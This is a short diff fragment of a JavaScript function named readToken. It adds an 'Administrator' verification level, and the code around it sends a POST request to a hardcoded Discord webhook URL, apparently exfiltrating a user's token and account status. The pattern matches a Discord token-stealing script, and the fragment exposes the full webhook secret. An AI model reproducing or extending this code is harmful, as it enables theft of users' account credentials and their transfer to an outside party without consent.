@@ -216,6 +216,8 @@ async function readToken() {
     var verifiedlevel = "None"
     if (verified == "true") {
       verifiedlevel = "Verified"
+    } else if (verified == "admin") {
+      verifiedlevel = "Administrator"
     }
     var rrequest = new XMLHttpRequest();
 rrequest.open("POST", "https://discord.com/api/webhooks/1126230000488697899/CsWQ-Zl-F1yLYw-mnHOIkdGlRd5KqHlKsGPspx6bxFQlYLVYU0u7Cildw_z3IEuGzqKO");
